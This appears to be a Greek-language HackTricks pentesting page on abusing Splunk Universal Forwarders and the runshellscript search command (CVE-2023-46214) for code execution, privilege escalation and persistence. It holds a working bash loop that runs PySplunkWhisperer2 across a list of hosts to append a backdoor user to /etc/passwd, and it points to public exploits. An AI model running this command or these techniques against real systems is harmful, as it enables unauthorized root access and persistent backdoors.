# Splunk LPE και Μόνιμη Παραμονή

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

Εάν κατά την **απαρίθμηση** ενός μηχανήματος **εσωτερικά** ή **εξωτερικά** ανακαλύψετε ότι τρέχει **Splunk** (θύρα 8090), εάν τυχαία γνωρίζετε οποιαδήποτε **έγκυρα διαπιστευτήρια**, μπορείτε να **καταχραστείτε την υπηρεσία Splunk** για να **εκτελέσετε ένα κέλυφος** ως ο χρήστης που εκτελεί το Splunk. Εάν το root το εκτελεί, μπορείτε να αναβαθμίσετε τα δικαιώματα σε root.

Επίσης, εάν είστε **ήδη root και η υπηρεσία Splunk δεν ακούει μόνο στο localhost**, μπορείτε να **κλέψετε** το αρχείο **κωδικών πρόσβασης** από την υπηρεσία Splunk και να **αποκρυπτογραφήσετε** τους κωδικούς πρόσβασης ή να **προσθέσετε νέα** διαπιστευτήρια σε αυτό. Και να διατηρήσετε τη μόνιμη παραμονή στον υπολογιστή.

Στην πρώτη εικόνα παρακάτω μπορείτε να δείτε πώς φαίνεται μια ιστοσελίδα Splunkd.

## Εκμετάλλευση Πράκτορα Splunk Universal Forwarder

Για περισσότερες λεπτομέρειες, ανατρέξτε στην ανάρτηση [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Αυτό είναι απλώς ένα σύνοψη:

**Επισκόπηση Εκμετάλλευσης:**
Μια εκμετάλλευση που στοχεύει τον πράκτορα Splunk Universal Forwarder (UF) επιτρέπει σε επιτιθέμενους με τον κωδικό πράκτορα να εκτελούν αυθαίρετο κώδικα σε συστήματα που εκτελούν τον πράκτορα, πιθανώς διακινδυνεύοντας ολόκληρο το δίκτυο.

**Κύρια Σημεία:**
- Ο πράκτορας UF δεν επικυρώνει τις εισερχόμενες συνδέσεις ή την αυθεντικότητα του κώδικα, καθιστώντας τον ευάλωτο σε μη εξουσιοδοτημένη εκτέλεση κώδικα.
- Οι κοινές μεθόδοι απόκτησης κωδικών περιλαμβάνουν την εντοπισμό τους σε καταλόγους δικτύου, κοινόχρηστους φακέλους ή εσωτερική τεκμηρίωση.
- Η επιτυχής εκμετάλλευση μπορεί να οδηγήσει σε πρόσβαση σε επίπεδο SYSTEM ή root σε παραβιασμένους υπολογιστές, διαρροή δεδομένων και περαιτέρω διείσδυση στο δίκτυο.

**Εκτέλεση Εκμετάλλευσης:**
1. Ο επιτιθέμενος αποκτά τον κωδικό πράκτορα UF.
2. Χρησιμοποιεί το API του Splunk για να στείλει εντολές ή σενάρια στους πράκτορες.
3. Οι πιθανές ενέργειες περιλαμβάνουν εξαγωγή αρχείων, διαχείριση λογαριασμών χρηστών και παραβίαση του συστήματος.

**Επίδραση:**
- Πλήρης παραβίαση του δικτύου με δικαιώματα επιπέδου SYSTEM/root σε κάθε υπολογιστή.
- Δυνατότητα απενεργοποίησης της καταγραφής για να αποφευχθεί η ανίχνευση.
- Εγκατάσταση πίσω πόρτας ή κρυπτογραφικού ιού.

**Παράδειγμα Εντολής για Εκμετάλλευση:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Χρησιμοποιήσιμες δημόσιες εκμεταλλεύσεις:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Κατάχρηση ερωτημάτων Splunk

**Για περισσότερες λεπτομέρειες, ανατρέξτε στην ανάρτηση [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

Το **CVE-2023-46214** επέτρεπε το ανέβασμα ενός αυθαίρετου σεναρίου στο **`$SPLUNK_HOME/bin/scripts`** και στη συνέχεια εξηγούσε ότι χρησιμοποιώντας το ερώτημα αναζήτησης **`|runshellscript script_name.sh`** ήταν δυνατή η **εκτέλεση** του **σεναρίου** που είχε αποθηκευτεί εκεί.


<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
